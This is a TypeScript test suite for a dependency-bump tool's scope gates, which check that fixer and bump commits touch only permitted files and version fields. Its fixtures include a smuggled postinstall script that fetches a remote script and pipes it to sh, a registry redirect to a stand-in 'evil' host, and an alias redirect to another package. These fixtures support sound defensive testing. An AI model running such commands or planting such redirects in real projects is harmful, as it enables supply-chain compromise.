import { test } from "node:test";
import assert from "node:assert/strict";
import { execSync } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { checkBumpScope, checkFixScope } from "../src/core/scope.ts";

function repoWithBaseline(pkg: string): string {
  const repo = mkdtempSync(join(tmpdir(), "depvisor-scope-"));
  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
  sh("git init -q");
  writeFileSync(join(repo, "package.json"), pkg);
  writeFileSync(join(repo, "src.ts"), "export {};\n");
  sh("git add -A");
  sh("git -c user.email=t@t -c user.name=t commit -qm baseline");
  return repo;
}

// checkFixScope is the fixer-path gate: the bump already happened deterministically
// (its commit is HEAD), so the fixer may only touch source/tests — ANY dependency
// state (manifest, lockfile, workspace/catalog file) is a violation.

test("checkFixScope denies any manifest, lockfile, and workspace-file change", () => {
  const repo = repoWithBaseline(`{"dependencies":{"dep":"2.0.0"}}`);
  // The bump commit is HEAD; the fixer then dirties the working tree.
  writeFileSync(join(repo, "package.json"), `{"dependencies":{"dep":"3.0.0"}}`); // manifest re-edit
  writeFileSync(join(repo, "package-lock.json"), `{"lockfileVersion":3}`); // new lockfiles
  writeFileSync(join(repo, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
  writeFileSync(join(repo, "bun.lock"), "{}\n");
  writeFileSync(join(repo, "pnpm-workspace.yaml"), "packages: []\n");
  writeFileSync(join(repo, "src.ts"), "export const fixed = 1;\n"); // the one legit change
  const scope = checkFixScope(repo, "HEAD");
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations.sort(), [
    "bun.lock",
    "package-lock.json",
    "package.json",
    "pnpm-lock.yaml",
    "pnpm-workspace.yaml",
  ]);
  assert.ok(!scope.violations.includes("src.ts"), "a source fix is in scope");
});

test("checkFixScope inherits the DENY list and catches nested manifests", () => {
  const repo = repoWithBaseline(`{"name":"root"}`);
  mkdirSync(join(repo, ".github/workflows"), { recursive: true });
  writeFileSync(join(repo, ".github/workflows/evil.yml"), "on: push\n");
  writeFileSync(join(repo, ".npmrc"), "registry=http://evil\n");
  mkdirSync(join(repo, "packages/a"), { recursive: true });
  writeFileSync(join(repo, "packages/a/package.json"), `{"name":"a"}`);
  const scope = checkFixScope(repo, "HEAD");
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations.sort(), [
    ".github/workflows/evil.yml",
    ".npmrc",
    "packages/a/package.json",
  ]);
});

test("checkFixScope passes when the fixer only touched source and tests", () => {
  const repo = repoWithBaseline(`{"name":"root"}`);
  writeFileSync(join(repo, "src.ts"), "export const adapted = true;\n");
  mkdirSync(join(repo, "test"), { recursive: true });
  writeFileSync(join(repo, "test/a.test.ts"), "// adapted assertion\n");
  assert.deepEqual(checkFixScope(repo, "HEAD"), { ok: true, violations: [] });
});

test("checkFixScope folds in changes committed since sinceRef (HEAD advanced past the bump)", () => {
  const repo = repoWithBaseline(`{"name":"root"}`);
  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
  const since = execSync("git rev-parse HEAD", { cwd: repo }).toString().trim();
  // Simulate the fixer COMMITTING a manifest edit (advancing HEAD past the bump
  // commit); changedPaths alone would miss it, so the sinceRef diff must fold in.
  writeFileSync(join(repo, "package.json"), `{"name":"root","dependencies":{"x":"1.0.0"}}`);
  sh("git add -A");
  sh("git -c user.email=t@t -c user.name=t commit -qm fixer-committed-a-manifest-edit");
  const scope = checkFixScope(repo, since);
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["package.json"]);
});

// checkBumpScope is the bump-path gate: it runs on the working-tree diff against
// base BEFORE the mechanical bump is committed, and allows ONLY genuine version
// moves of the group's own members in the files that enter that commit. It
// exists to catch an install lifecycle script that rewrote a manifest beyond the
// update itself (which would otherwise ride along in the "mechanical" commit).

function bumpRepo(baseFiles: Record<string, string>): string {
  const repo = mkdtempSync(join(tmpdir(), "depvisor-bumpscope-"));
  const sh = (cmd: string) => execSync(cmd, { cwd: repo });
  sh("git init -q");
  for (const [name, content] of Object.entries(baseFiles)) writeInto(repo, name, content);
  sh("git add -A");
  sh("git -c user.email=t@t -c user.name=t commit -qm baseline");
  return repo;
}

function writeInto(repo: string, name: string, content: string): void {
  const path = join(repo, name);
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, content);
}

test("checkBumpScope passes a legal npm-style bump (member version moved, lockfile changed)", () => {
  const repo = bumpRepo({
    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
    "package-lock.json": JSON.stringify({ lockfileVersion: 3 }),
  });
  writeInto(repo, "package.json", JSON.stringify({ dependencies: { "left-pad": "^1.3.0" } }));
  writeInto(repo, "package-lock.json", JSON.stringify({ lockfileVersion: 3, refreshed: true }));
  assert.deepEqual(checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []), {
    ok: true,
    violations: [],
  });
});

test("checkBumpScope denies a scripts change smuggled alongside the bump", () => {
  const repo = bumpRepo({
    "package.json": JSON.stringify({
      dependencies: { "left-pad": "^1.0.0" },
      scripts: { build: "tsc" },
    }),
  });
  writeInto(
    repo,
    "package.json",
    JSON.stringify({
      dependencies: { "left-pad": "^1.3.0" },
      scripts: { build: "tsc", postinstall: "curl evil | sh" },
    }),
  );
  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["package.json#scripts"]);
});

test("checkBumpScope denies an added dependency key", () => {
  const repo = bumpRepo({
    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
  });
  writeInto(
    repo,
    "package.json",
    JSON.stringify({ dependencies: { "left-pad": "^1.3.0", evil: "*" } }),
  );
  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["package.json#dependencies.evil"]);
});

test("checkBumpScope denies a non-member version change", () => {
  const repo = bumpRepo({
    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0", chalk: "^4.0.0" } }),
  });
  writeInto(
    repo,
    "package.json",
    JSON.stringify({ dependencies: { "left-pad": "^1.3.0", chalk: "^5.0.0" } }),
  );
  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["package.json#dependencies.chalk"]);
});

test("checkBumpScope denies a member value that does not carry latest", () => {
  const repo = bumpRepo({
    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
  });
  writeInto(repo, "package.json", JSON.stringify({ dependencies: { "left-pad": "^1.2.9" } }));
  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["package.json#dependencies.left-pad"]);
});

test("checkBumpScope denies a de-catalog (catalog: reference rewritten to a plain version)", () => {
  const repo = bumpRepo({
    "package.json": JSON.stringify({ dependencies: { semver: "catalog:" } }),
  });
  // A de-catalog carries latest, but the OLD value was a catalog: reference, so
  // it is still a violation (the executor's mistaken de-catalog vector).
  writeInto(repo, "package.json", JSON.stringify({ dependencies: { semver: "7.7.3" } }));
  const scope = checkBumpScope(repo, "HEAD", [{ name: "semver", latest: "7.7.3" }], []);
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["package.json#dependencies.semver"]);
});

test("checkBumpScope denies a newly created package.json (install script planting a manifest)", () => {
  const repo = bumpRepo({
    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
  });
  writeInto(repo, "packages/evil/package.json", JSON.stringify({ scripts: { postinstall: "x" } }));
  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["packages/evil/package.json (new)"]);
});

test("checkBumpScope denies an unparseable package.json", () => {
  const repo = bumpRepo({
    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
  });
  writeInto(repo, "package.json", "{ not json");
  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["package.json (unparseable)"]);
});

test("checkBumpScope passes a legal pnpm-workspace.yaml catalog move (default + named)", () => {
  const repo = bumpRepo({
    "pnpm-workspace.yaml": "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n",
    "pnpm-lock.yaml": "lockfileVersion: '9.0'\n",
  });
  writeInto(repo, "pnpm-workspace.yaml", "packages:\n  - packages/*\ncatalog:\n  semver: ^7.7.3\n");
  writeInto(repo, "pnpm-lock.yaml", "lockfileVersion: '9.0'\nrefreshed: true\n");
  assert.deepEqual(
    checkBumpScope(
      repo,
      "HEAD",
      [{ name: "semver", latest: "7.7.3" }],
      [{ name: "semver", target: "7.7.3", catalog: null }],
    ),
    { ok: true, violations: [] },
  );
});

test("checkBumpScope passes a named-catalog member move", () => {
  const repo = bumpRepo({ "pnpm-workspace.yaml": "catalogs:\n  react:\n    react: ^18.0.0\n" });
  writeInto(repo, "pnpm-workspace.yaml", "catalogs:\n  react:\n    react: ^19.0.0\n");
  assert.deepEqual(
    checkBumpScope(
      repo,
      "HEAD",
      [{ name: "react", latest: "19.0.0" }],
      [{ name: "react", target: "19.0.0", catalog: "react" }],
    ),
    { ok: true, violations: [] },
  );
});

test("checkBumpScope denies non-catalog pnpm-workspace.yaml changes (packages / onlyBuiltDependencies)", () => {
  const repo = bumpRepo({
    "pnpm-workspace.yaml": "packages:\n  - packages/*\ncatalog:\n  semver: ^7.3.0\n",
  });
  writeInto(
    repo,
    "pnpm-workspace.yaml",
    "packages:\n  - packages/*\n  - tools/*\ncatalog:\n  semver: ^7.7.3\nonlyBuiltDependencies:\n  - esbuild\n",
  );
  const scope = checkBumpScope(
    repo,
    "HEAD",
    [{ name: "semver", latest: "7.7.3" }],
    [{ name: "semver", target: "7.7.3", catalog: null }],
  );
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations.sort(), [
    "pnpm-workspace.yaml#onlyBuiltDependencies",
    "pnpm-workspace.yaml#packages",
  ]);
});

test("checkBumpScope denies an alias redirect that carries the target version", () => {
  const repo = bumpRepo({
    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
  });
  // `npm:evil@1.3.0` contains the vetted "1.3.0" but redirects the dependency
  // to a different package — the strict whole-string grammar must reject it
  // (and with it every git:/file:/link:/URL specifier).
  writeInto(
    repo,
    "package.json",
    JSON.stringify({ dependencies: { "left-pad": "npm:evil@1.3.0" } }),
  );
  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["package.json#dependencies.left-pad"]);
});

test("checkBumpScope denies a compound range even when it contains the target", () => {
  const repo = bumpRepo({
    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
  });
  // Only the exact/caret/tilde shapes the PM commands write are legal; an
  // exotic range fails closed rather than widening the grammar.
  writeInto(repo, "package.json", JSON.stringify({ dependencies: { "left-pad": ">=1.3.0 <2" } }));
  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["package.json#dependencies.left-pad"]);
});

test("checkBumpScope denies a change in a catalog the plan did not target", () => {
  const repo = bumpRepo({
    "pnpm-workspace.yaml": "catalog:\n  semver: ^7.3.0\ncatalogs:\n  legacy:\n    semver: ^7.3.0\n",
  });
  // The plan edited only the default catalog; the same-named entry in the
  // unreferenced `legacy` catalog changed too (an alias redirect, even) — that
  // is not the executor's write and must be a violation.
  writeInto(
    repo,
    "pnpm-workspace.yaml",
    "catalog:\n  semver: ^7.7.3\ncatalogs:\n  legacy:\n    semver: npm:evil@7.7.3\n",
  );
  const scope = checkBumpScope(
    repo,
    "HEAD",
    [{ name: "semver", latest: "7.7.3" }],
    [{ name: "semver", target: "7.7.3", catalog: null }],
  );
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["pnpm-workspace.yaml#catalogs.legacy.semver"]);
});

test("checkBumpScope allows a default-catalog edit landing in catalogs.default", () => {
  const repo = bumpRepo({
    "pnpm-workspace.yaml": "catalogs:\n  default:\n    semver: ^7.3.0\n",
  });
  // pnpm treats `catalog:` as sugar for `catalog:default`, and the executor
  // resolves a default edit to catalogs.default when no top-level catalog map
  // exists — the gate must accept the same landing spot.
  writeInto(repo, "pnpm-workspace.yaml", "catalogs:\n  default:\n    semver: ^7.7.3\n");
  assert.deepEqual(
    checkBumpScope(
      repo,
      "HEAD",
      [{ name: "semver", latest: "7.7.3" }],
      [{ name: "semver", target: "7.7.3", catalog: null }],
    ),
    { ok: true, violations: [] },
  );
});

test("checkBumpScope denies an unparseable pnpm-workspace.yaml", () => {
  const repo = bumpRepo({ "pnpm-workspace.yaml": "catalog:\n  semver: ^7.3.0\n" });
  // A YAML sequence root is not a plain map → illegible → fail-closed.
  writeInto(repo, "pnpm-workspace.yaml", "- just\n- a\n- list\n");
  const scope = checkBumpScope(repo, "HEAD", [{ name: "semver", latest: "7.7.3" }], []);
  assert.equal(scope.ok, false);
  assert.deepEqual(scope.violations, ["pnpm-workspace.yaml (unparseable)"]);
});
